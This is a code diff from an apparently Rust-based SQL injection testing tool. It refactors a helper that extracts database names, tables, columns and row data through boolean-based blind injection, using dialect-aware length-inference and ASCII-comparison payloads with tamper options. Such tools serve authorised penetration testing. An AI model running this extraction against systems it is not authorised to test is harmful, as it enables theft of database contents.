@@ -2244,9 +2919,12 @@ async fn test_oob_bounded(
     }
 }
 
-/// Helper to extract a single field (databases, tables, columns, dump, count) via boolean-based blind SQLi.
+/// Helper to extract a single field (databases, tables, columns, dump, count) via boolean-based blind `SQLi`.
 /// Uses binary search on ASCII values with the provided query.
+/// Dialect-aware: length/char comparison built from `DbmsKind`
+/// (`LEN` on MSSQL, `SUBSTR` on Oracle, `::text` cast on Postgres).
 #[allow(clippy::too_many_arguments)]
+#[allow(clippy::too_many_lines)]
 async fn extract_enum_field(
     client: &HttpClient,
     state: &Arc<RwLock<SessionState>>,
@@ -2262,10 +2940,23 @@ async fn extract_enum_field(
     raw: Option<&RawRequest>,
     tampers: &[Tamper],
     opts: ProbeOpts,
-) -> Option<String> {
+    dbms_kind: &crate::dbms::DbmsKind,
+    popts: &PayloadOpts,
+    matcher: &crate::detection::matcher::MatcherConfig,
+    _ignore_codes: &[u16],
+) -> Result<Option<String>, crate::error::InjektError> {
     let engine = crate::extraction::engine::ExtractionEngine::new(
         crate::extraction::engine::ExtractionConfig::default(),
     );
+
+    // Single source of truth for dialect SQL: reuse the `DbmsDetector`
+    // `length_expr` / `ascii_cmp_expr` impls instead of re-matching on kind.
+    let detector = crate::dbms::common::detector_for_kind(dbms_kind);
+    // Matcher pre-processing (`--text-only` strips HTML) is applied to both
+    // baseline and fetched bodies before `diff_against_baseline` so the
+    // comparison stays consistent. No veto by `--code`/`--string` here:
+    // enumeration is detection-only (a veto would only hide data).
+    let baseline_proc = matcher.pre_process(baseline_body);
 
     // First infer length (max 500 chars for enum results)
     let mut inferred_len = 0;
@@ -2273,21 +2964,22 @@ async fn extract_enum_field(
         if cancel.is_cancelled() {
             break;
         }
-        let base = format!("' AND LENGTH(({query}))>={len_guess} -- -");
-        let payload = apply_tampers(&base, tampers);
+        let base = format!("' AND {}>={len_guess} -- -", detector.length_expr(&query));
+        let payload = build_final_payload(&base, tampers, popts);
         let spec = build_injection_spec_with_raw(
-            target, target_str, param, &payload, marker_set, raw, opts,
+            target, target_str, param, &payload, marker_set, raw, opts, popts,
         );
         let start = std::time::Instant::now();
         let resp = client.send_with_retry(spec, cancel).await;
         let ms = start.elapsed().as_secs_f64() * 1000.0;
         state.write().await.increment_requests();
-        let body = match resp {
+        let raw_body = match resp {
             Ok(r) => r.text().await.unwrap_or_default(),
             Err(_) => String::new(),
         };
+        let body = matcher.pre_process(&raw_body);
         let diff = crate::detection::response_diff::diff_against_baseline(
-            baseline_body,
+            &baseline_proc,
             &body,
             baseline_mean,
             ms,
@@ -2301,7 +2993,7 @@ async fn extract_enum_field(
     }
     if inferred_len == 0 {
         warn!(label=%label, "enumeration length inference failed");
-        return None;
+        return Ok(None);
     }
 
     let client_clone = client.clone();
@@ -2311,11 +3003,14 @@ async fn extract_enum_field(
     let target_str_clone = target_str.to_owned();
     let param_clone = param.clone();
     let marker_set_clone = marker_set.clone();
-    let baseline_body_clone = baseline_body.to_owned();
+    let baseline_body_clone = baseline_proc.clone();
     let baseline_mean_clone = baseline_mean;
     let query_for_oracle = query.clone();
     let raw_for_oracle = raw.cloned();
     let tampers_for_oracle = tampers.to_vec();
+    let dbms_for_oracle = *dbms_kind;
+    let popts_for_oracle = (*popts).clone();
+    let matcher_for_oracle = matcher.clone();
 
     let oracle = move |pos: usize, mid: u8| {
         let client = client_clone.clone();
@@ -2329,13 +3024,14 @@ async fn extract_enum_field(
         let query = query_for_oracle.clone();
         let raw = raw_for_oracle.clone();
         let tampers = tampers_for_oracle.clone();
+        let dbms_kind = dbms_for_oracle;
+        let popts = popts_for_oracle.clone();
+        let matcher = matcher_for_oracle.clone();
         async move {
-            let base = format!(
-                "' AND ASCII(SUBSTRING(({query}),{},1))>={} -- -",
-                pos + 1,
-                mid
-            );
-            let payload = apply_tampers(&base, &tampers);
+            let detector = crate::dbms::common::detector_for_kind(&dbms_kind);
+            let cmp = detector.ascii_cmp_expr(&query, pos, mid);
+            let base = format!("' AND {cmp} -- -");
+            let payload = build_final_payload(&base, &tampers, &popts);
             let spec = build_injection_spec_with_raw(
                 &target,
                 &target_str,
@@ -2344,15 +3040,17 @@ async fn extract_enum_field(
                 &marker_set,
                 raw.as_ref(),
                 opts,
+                &popts,
             );
             let start = std::time::Instant::now();
             let resp = client.send_with_retry(spec, &cancel).await;
             let ms = start.elapsed().as_secs_f64() * 1000.0;
             state.write().await.increment_requests();
-            let body = match resp {
+            let raw_body = match resp {
                 Ok(r) => r.text().await.unwrap_or_default(),
                 Err(_) => String::new(),
             };
+            let body = matcher.pre_process(&raw_body);
             let diff = crate::detection::response_diff::diff_against_baseline(
                 &baseline_body,
                 &body,
@@ -2360,15 +3058,15 @@ async fn extract_enum_field(
                 ms,
                 100.0,
             );
-            diff.confidence < 0.4
+            Ok::<bool, InjektError>(diff.confidence < 0.4)
         }
     };
 
-    let extracted = engine.extract(inferred_len, oracle).await;
+    let extracted = engine.extract(inferred_len, oracle).await?;
     let exposed = {
         use secrecy::ExposeSecret;
         extracted.expose_secret().to_owned()
     };
     info!(label=%label, extracted=%crate::session::scrubber::Scrubber::hash_truncated(&exposed), len=%exposed.len(), "enumeration extracted");
-    Some(exposed)
+    Ok(Some(exposed))
 }
